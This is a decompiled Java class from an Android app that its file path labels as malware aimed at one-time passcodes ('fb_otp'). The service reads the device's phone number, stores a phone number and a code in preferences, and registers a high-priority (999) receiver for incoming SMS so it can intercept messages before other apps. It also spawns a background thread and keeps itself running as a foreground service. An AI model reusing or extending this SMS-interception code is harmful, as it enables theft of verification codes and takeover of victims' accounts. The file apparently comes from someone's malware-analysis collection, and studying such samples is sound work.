package com.soft360.iService;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import cx;
import dU;
import ef;
import em;

public class AService
  extends Service
{
  public static int a;
  public static Context a;
  public static String a;
  final IntentFilter jdField_a_of_type_AndroidContentIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
  private SmsReciever jdField_a_of_type_ComSoft360IServiceSmsReciever;
  
  static
  {
    jdField_a_of_type_JavaLangString = "";
    jdField_a_of_type_Int = 0;
  }
  
  public static void a()
  {
    Object localObject = PreferenceManager.getDefaultSharedPreferences(jdField_a_of_type_AndroidContentContext.getApplicationContext()).edit();
    ((SharedPreferences.Editor)localObject).putString("tel1", em.jdField_a_of_type_JavaLangString);
    ((SharedPreferences.Editor)localObject).commit();
    localObject = em.jdField_a_of_type_JavaLangString;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    jdField_a_of_type_JavaLangString = ((TelephonyManager)getApplicationContext().getSystemService("phone")).getLine1Number();
    jdField_a_of_type_AndroidContentContext = this;
    Thread.setDefaultUncaughtExceptionHandler(new ef(jdField_a_of_type_AndroidContentContext));
    dU localdU = dU.a(null);
    SharedPreferences localSharedPreferences = PreferenceManager.getDefaultSharedPreferences(jdField_a_of_type_AndroidContentContext.getApplicationContext());
    String str = localSharedPreferences.getString("tel1", localdU.c());
    em.jdField_a_of_type_JavaLangString = str;
    em.b = str;
    try
    {
      jdField_a_of_type_Int = localSharedPreferences.getInt("domain_index", 0);
      localdU.i = localSharedPreferences.getString("kode8", "");
      new StringBuilder("AService onCreate ").append(em.jdField_a_of_type_JavaLangString).toString();
      this.jdField_a_of_type_AndroidContentIntentFilter.setPriority(999);
      this.jdField_a_of_type_ComSoft360IServiceSmsReciever = new SmsReciever();
      registerReceiver(this.jdField_a_of_type_ComSoft360IServiceSmsReciever, this.jdField_a_of_type_AndroidContentIntentFilter);
      new Thread(new cx(this)).start();
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        jdField_a_of_type_Int = 0;
      }
    }
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    startForeground(0, new Notification());
    return 0;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/com/soft360/iService/AService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */